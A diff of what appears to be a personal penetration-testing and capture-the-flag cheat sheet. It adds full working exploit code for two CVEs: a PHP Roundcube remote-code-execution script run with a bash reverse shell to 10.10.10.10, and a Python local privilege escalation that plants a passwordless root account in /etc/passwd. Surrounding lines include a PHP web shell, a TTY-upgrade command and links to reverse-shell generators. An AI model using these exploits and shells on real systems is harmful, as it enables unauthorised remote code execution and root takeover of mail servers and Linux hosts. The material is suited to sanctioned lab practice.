@@ -9,13 +9,15 @@ ip<->host: ```vim /etc/hosts```
 
 dir scan: ```ffuf -w /usr/share/dirb/wordlists/common.txt -u http://example.com/FUZZ -recursion```
 
-sub domain scan: ```ffuf -u 'http://soulmate.htb/' -H 'Host: FUZZ.example.com -w /usr/share/wfuzz/wordlist/general/medium.txt -fw 4```
+sub domain scan: ```ffuf -u 'http://example.com/' -H 'Host: FUZZ.example.com -w /usr/share/wfuzz/wordlist/general/medium.txt -fw 4```
 
 hash: ```john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5```
 
 git: ```git clone https://github.com/example/example.git```
 
 Web Shell: ```<?php echo "<div>".system($_GET['cmd'])."</div>"; ?>```
+
+升級tty: ```script /dev/null -qc /bin/bash```
 
 sudo: 
 ```
@@ -24,6 +26,11 @@ ss -tuln
 sudo -l
 find / -type f -perm -4000 2>/dev/null
 ```
+## link
+* https://www.revshells.com/
+* https://crackstation.net/
+* https://www.base64decode.org/
+* https://keydecryptor.com/decryption-tools/roundcube
 
 ## CVE
 ### CVE-2024-28397
@@ -320,4 +327,383 @@ if __name__ == "__main__":
     )
 
     print(f"[+] Exploit Complete you can now login with\n   [*] Username: {args.new_user}\n   [*] Password: {args.password}.")
+```
+### CVE-2025-49113
+https://github.com/hakaioffsec/CVE-2025-49113-exploit/tree/main
+```
+nc -lvnp 9001
+```
+```
+php CVE-2025-49113.php http:// <url> <username> <password>  "bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'"
+```
+```
+<?php
+class Crypt_GPG_Engine
+{
+    public $_process = false;
+    public $_gpgconf = '';
+    public $_homedir = '';
+
+    public function __construct($_gpgconf)
+    {
+        $_gpgconf = base64_encode($_gpgconf);
+        $this->_gpgconf = "echo \"{$_gpgconf}\"|base64 -d|sh;#";
+    }
+
+    public function gadget()
+    {
+        return '|'. serialize($this) . ';';
+    }
+}
+
+function checkVersion($baseUrl)
+{
+    echo "[*] Checking Roundcube version...\n";
+    
+    $context = stream_context_create([
+        'http' => [
+            'method' => 'GET',
+            'header' => "User-Agent: Roundcube exploit CVE-2025-49113 - Hakai Security\r\n",
+            'ignore_errors' => true,
+        ],
+    ]);
+
+    $response = file_get_contents($baseUrl, false, $context);
+    
+    if ($response === FALSE) {
+        echo "[-] Error: Failed to check version.\n";
+        exit(1);
+    }
+
+    $vulnerableVersions = [
+        '10500', '10501', '10502', '10503', '10504', '10505', '10506', '10507', '10508', '10509',
+        '10600', '10601', '10602', '10603', '10604', '10605', '10606', '10607', '10608', '10609', '10610'
+    ];
+
+    preg_match('/"rcversion":(\d+)/', $response, $matches);
+    
+    if (empty($matches[1])) {
+        echo "[-] Error: Could not detect Roundcube version.\n";
+        exit(1);
+    }
+
+    $version = $matches[1];
+    echo "[*] Detected Roundcube version: " . $version . "\n";
+
+    if (in_array($version, $vulnerableVersions)) {
+        echo "[+] Target is vulnerable!\n";
+        return true;
+    } else {
+        echo "[-] Target is not vulnerable.\n";
+        exit(1);
+    }
+}
+
+function login($baseUrl, $user, $pass)
+{
+    // Configuration to capture session cookies
+    $context = stream_context_create([
+        'http' => [
+            'method' => 'GET',
+            'header' => "User-Agent: Roundcube exploit CVE-2025-49113 - Hakai Security\r\n",
+            'ignore_errors' => true,
+            // 'request_fulluri' => false, // necessary for HTTP proxies like Burp
+            // 'proxy' => 'tcp://127.0.0.1:8080',
+        ],
+    ]);
+
+    // Make a GET request to the initial page
+    $response = file_get_contents($baseUrl, false, $context);
+
+    if ($response === FALSE) {
+        echo "Error: Failed to obtain the initial page.\n";
+        exit(1);
+    }
+
+    // Extract the 'roundcube_sessid' cookie
+    preg_match('/Set-Cookie: roundcube_sessid=([^;]+)/', implode("\n", $http_response_header), $matches);
+    if (empty($matches[1])) {
+        echo "Error: 'roundcube_sessid' cookie not found.\n";
+        exit(1);
+    }
+    $sessionCookie = 'roundcube_sessid=' . $matches[1];
+
+    // Extract the CSRF token from the JavaScript code
+    preg_match('/"request_token":"([^"]+)"/', $response, $matches);
+    if (empty($matches[1])) {
+        echo "Error: CSRF token not found.\n";
+        exit(1);
+    }
+
+    $csrfToken = $matches[1];
+
+    $url = $baseUrl . '/?_task=login';
+
+    $data = http_build_query([
+        '_token'    => $csrfToken,
+        '_task'     => 'login',
+        '_action'   => 'login',
+        '_timezone' => 'America/Sao_Paulo',
+        '_url'      => '',
+        '_user'     => $user,
+        '_pass'     => $pass,
+    ]);
+
+    $options = [
+        'http' => [
+            'header'  => "Content-type: application/x-www-form-urlencoded\r\n" .
+                        "Cookie: " . $sessionCookie . "\r\n",
+            'method'  => 'POST',
+            'content' => $data,
+            'ignore_errors' => true,
+            // 'request_fulluri' => true, // necessary for HTTP proxies like Burp
+            // 'proxy' => 'tcp://127.0.0.1:8080',
+        ],
+    ];
+
+    $context  = stream_context_create($options);
+    $result = file_get_contents($url, false, $context);
+
+    if ($result === FALSE) {
+        echo "Error: Failed to make the request.\n";
+        exit(1);
+    }
+
+    // Check the HTTP status code
+    $statusLine = $http_response_header[0];
+    preg_match('{HTTP/\S*\s(\d{3})}', $statusLine, $match);
+    $status = $match[1];
+
+    if ($status == 401) {
+        echo "Error: Incorrect credentials.\n";
+        exit(1);
+    } elseif ($status != 302) {
+        echo "Error: Request failed with status code $status.\n";
+        exit(1);
+    }
+
+    // Extract the last 'roundcube_sessauth' cookie from the login response, ignoring the cookie with value '-del-'
+    preg_match_all('/Set-Cookie: roundcube_sessauth=([^;]+)/', implode("\n", $http_response_header), $matches);
+    if (empty($matches[1])) {
+        echo "Error: 'roundcube_sessauth' cookie not found.\n";
+        exit(1);
+    }
+    $authCookie = 'roundcube_sessauth=' . end($matches[1]);
+
+    // Extract the 'roundcube_sessid' cookie from the login response
+    preg_match('/Set-Cookie: roundcube_sessid=([^;]+)/', implode("\n", $http_response_header), $matches);
+    if (empty($matches[1])) {
+        echo "Error: 'roundcube_sessid' cookie not found.\n";
+        exit(1);
+    }
+    $sessionCookie = 'roundcube_sessid=' . $matches[1];
+
+    echo "[+] Login successful!\n";
+
+    return [
+        'sessionCookie' => $sessionCookie,
+        'authCookie' => $authCookie,
+    ];
+}
+
+function uploadImage($baseUrl, $sessionCookie, $authCookie, $gadget)
+{
+    $uploadUrl = $baseUrl . '/?_task=settings&_framed=1&_remote=1&_from=edit-!xxx&_id=&_uploadid=upload1749190777535&_unlock=loading1749190777536&_action=upload';
+
+    // Hardcoded PNG image in base64
+    $base64Image = 'iVBORw0KGgoAAAANSUhEUgAAAIAAAABcCAYAAACmwr2fAAAAAXNSR0IArs4c6QAAAGxlWElmTU0AKgAAAAgABAEaAAUAAAABAAAAPgEbAAUAAAABAAAARgEoAAMAAAABAAIAAIdpAAQAAAABAAAATgAAAAAAAACQAAAAAQAAAJAAAAABAAKgAgAEAAAAAQAAAICgAwAEAAAAAQAAAFwAAAAAbqF/KQAAAAlwSFlzAAAWJQAAFiUBSVIk8AAAAWBJREFUeAHt1MEJACEAxMDzSvEn2H97CrYx2Q4Swo659vkaa+BnyQN/BgoAD6EACgA3gOP3AAWAG8Dxe4ACwA3g+D1AAeAGcPweoABwAzh+D1AAuAEcvwcoANwAjt8DFABuAMfvAQoAN4Dj9wAFgBvA8XuAAsAN4Pg9QAHgBnD8HqAAcAM4fg9QALgBHL8HKADcAI7fAxQAbgDH7wEKADeA4/cABYAbwPF7gALADeD4PUAB4AZw/B6gAHADOH4PUAC4ARy/BygA3ACO3wMUAG4Ax+8BCgA3gOP3AAWAG8Dxe4ACwA3g+D1AAeAGcPweoABwAzh+D1AAuAEcvwcoANwAjt8DFABuAMfvAQoAN4Dj9wAFgBvA8XuAAsAN4Pg9QAHgBnD8HqAAcAM4fg9QALgBHL8HKADcAI7fAxQAbgDH7wEKADeA4/cABYAbwPF7gALADeD4PUAB4AZw/B4AD+ACXpACLpoPsQQAAAAASUVORK5CYII=';
+
+    // Decode the base64 image
+    $fileContent = base64_decode($base64Image);
+    if ($fileContent === FALSE) {
+        echo "Error: Failed to decode the base64 image.\n";
+        exit(1);
+    }
+
+    $boundary = uniqid();
+    $data = "--" . $boundary . "\r\n" .
+            "Content-Disposition: form-data; name=\"_file[]\"; filename=\"" . $gadget . "\"\r\n" .
+            "Content-Type: image/png\r\n\r\n" .
+            $fileContent . "\r\n" .
+            "--" . $boundary . "--\r\n";
+
+    $options = [
+        'http' => [
+            'header'  => "Content-type: multipart/form-data; boundary=" . $boundary . "\r\n" .
+                        "Cookie: " . $sessionCookie . "; " . $authCookie . "\r\n",
+            'method'  => 'POST',
+            'content' => $data,
+            'ignore_errors' => true,
+            // 'request_fulluri' => true, // necessary for HTTP proxies like Burp
+            // 'proxy' => 'tcp://127.0.0.1:8080',
+        ],
+    ];
+
+    echo "[*] Exploiting...\n";
+    
+    $context  = stream_context_create($options);
+    $result = file_get_contents($uploadUrl, false, $context);
+
+    if ($result === FALSE) {
+        echo "Error: Failed to send the file.\n";
+        exit(1);
+    }
+
+    // Check the HTTP status code
+    $statusLine = $http_response_header[0];
+    preg_match('{HTTP/\S*\s(\d{3})}', $statusLine, $match);
+    $status = $match[1];
+
+    if ($status != 200) {
+        echo "Error: File upload failed with status code $status.\n";
+        exit(1);
+    }
+
+    echo "[+] Gadget uploaded successfully!\n";
+}
+
+function exploit($baseUrl, $user, $pass, $rceCommand)
+{
+    echo "[+] Starting exploit (CVE-2025-49113)...\n";
+    
+    // Check version before proceeding
+    checkVersion($baseUrl);
+    
+    // Instantiate the Crypt_GPG_Engine class with the RCE command
+    $gpgEngine = new Crypt_GPG_Engine($rceCommand);
+    $gadget = $gpgEngine->gadget();
+
+    // Escape double quotes in the gadget
+    $gadget = str_replace('"', '\\"', $gadget);
+
+    // Login and get session cookies
+    $cookies = login($baseUrl, $user, $pass);
+
+    // Upload the image with the gadget
+    uploadImage($baseUrl, $cookies['sessionCookie'], $cookies['authCookie'], $gadget);
+}
+
+if ($argc !== 5) {
+    echo "Usage: php CVE-2025-49113.php <url> <username> <password> <command>\n";
+    exit(1);
+}
+
+$baseUrl = $argv[1];
+$user = $argv[2];
+$pass = $argv[3];
+$rceCommand = $argv[4];
+
+exploit($baseUrl, $user, $pass, $rceCommand);
+```
+
+### CVE-2025-27591
+https://github.com/BridgerAlderson/CVE-2025-27591-PoC
+```
+#!/usr/bin/env python3
+import os
+import subprocess
+import sys
+import pty
+
+BINARY = "/usr/bin/below"
+LOG_DIR = "/var/log/below"
+TARGET_LOG = f"{LOG_DIR}/error_root.log"
+TMP_PAYLOAD = "/tmp/attacker"
+
+MALICIOUS_PASSWD_LINE = "attacker::0:0:attacker:/root:/bin/bash\n"
+
+def check_world_writable(path):
+    st = os.stat(path)
+    return bool(st.st_mode & 0o002)
+
+def is_symlink(path):
+    return os.path.islink(path)
+
+def run_cmd(cmd, show_output=True):
+    if show_output:
+        print(f"[+] Running: {cmd}")
+    try:
+        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
+    except subprocess.CalledProcessError as e:
+        if show_output:
+            print(f"[-] Command failed: {e.output}")
+        return None
+
+def check_vulnerability():
+    print("[*] Checking for CVE-2025-27591 vulnerability...")
+
+    if not os.path.exists(LOG_DIR):
+        print(f"[-] Log directory {LOG_DIR} does not exist.")
+        return False
+
+    if not check_world_writable(LOG_DIR):
+        print(f"[-] {LOG_DIR} is not world-writable.")
+        return False
+    print(f"[+] {LOG_DIR} is world-writable.")
+
+    if os.path.exists(TARGET_LOG):
+        if is_symlink(TARGET_LOG):
+            print(f"[+] {TARGET_LOG} is already a symlink. Looks exploitable.")
+            return True
+        else:
+            print(f"[!] {TARGET_LOG} is a regular file. Removing it...")
+            os.remove(TARGET_LOG)
+
+    try:
+        os.symlink("/etc/passwd", TARGET_LOG)
+        print(f"[+] Symlink created: {TARGET_LOG} -> /etc/passwd")
+        os.remove(TARGET_LOG)  
+        return True
+    except Exception as e:
+        print(f"[-] Failed to create symlink: {e}")
+        return False
+
+def exploit():
+    print("[*] Starting exploitation...")
+
+    with open(TMP_PAYLOAD, "w") as f:
+        f.write(MALICIOUS_PASSWD_LINE)
+    print(f"[+] Wrote malicious passwd line to {TMP_PAYLOAD}")
+
+    if os.path.exists(TARGET_LOG):
+        os.remove(TARGET_LOG)
+    os.symlink("/etc/passwd", TARGET_LOG)
+    print(f"[+] Symlink set: {TARGET_LOG} -> /etc/passwd")
+
+    print("[*] Executing 'below record' as root to trigger logging...")
+    try:
+        subprocess.run(["sudo", BINARY, "record"], timeout=40)
+        print("[+] 'below record' executed.")
+    except subprocess.TimeoutExpired:
+        print("[-] 'below record' timed out (may still have written to the file).")
+    except Exception as e:
+        print(f"[-] Failed to execute 'below': {e}")
+
+    print("[*] Appending payload into /etc/passwd via symlink...")
+    try:
+        with open(TARGET_LOG, "a") as f:
+            f.write(MALICIOUS_PASSWD_LINE)
+        print("[+] Payload appended successfully.")
+    except Exception as e:
+        print(f"[-] Failed to append payload: {e}")
+
+    print("[*] Attempting to switch to root shell via 'su attacker'...")
+    try:
+        pty.spawn(["su", "attacker"])
+    except Exception as e:
+        print(f"[-] Failed to spawn shell: {e}")
+        return False
+
+def main():
+    if not check_vulnerability():
+        print("[-] Target does not appear vulnerable.")
+        sys.exit(1)
+    print("[+] Target is vulnerable.")
+
+    if not exploit():
+        print("[-] Exploitation failed.")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
 ```
